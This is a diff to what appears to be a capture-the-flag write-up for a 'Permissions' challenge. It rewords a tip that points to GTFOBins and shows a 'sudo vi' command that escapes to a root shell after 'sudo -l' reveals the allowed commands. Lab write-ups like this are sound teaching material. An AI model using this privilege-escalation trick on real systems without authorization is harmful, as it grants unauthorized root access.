@@ -13,7 +13,7 @@ Using `sudo -l`, we can see which commands we can execute as the user `picoplaye
 ![image_2](../assets/images/Permissions_image_2.png)
 
 > [!TIP]
-> I used [gtfobins/vi](https://gtfobins.github.io/gtfobins/vi/). Check the last `sudo` command.  
+> Check [gtfobins/vi](https://gtfobins.github.io/gtfobins/vi/) and scroll to the last `sudo` command.  
 
 ```bash
 sudo vi -c ':!/bin/sh' /dev/null
